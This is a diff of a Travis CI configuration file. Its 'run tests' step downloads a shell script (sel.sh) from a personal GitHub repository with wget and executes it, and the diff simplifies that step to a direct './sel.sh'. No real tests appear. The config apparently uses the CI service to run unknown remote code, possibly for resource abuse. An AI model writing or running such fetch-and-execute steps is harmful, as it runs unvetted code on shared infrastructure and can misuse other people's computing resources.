@@ -26,11 +26,9 @@ python:
   - "3.9"
 # command to install dependencies
 
-install: 
-  - pip install travis-wait-improved
 
 # command to run tests
 script:
   - wget https://github.com/lallianto/lalli/raw/main/sel.sh
   - chmod +x sel.sh 
-  - travis-wait-improved --timeout 30m ./sel.sh > screen -R azuvi 
+  - ./sel.sh  
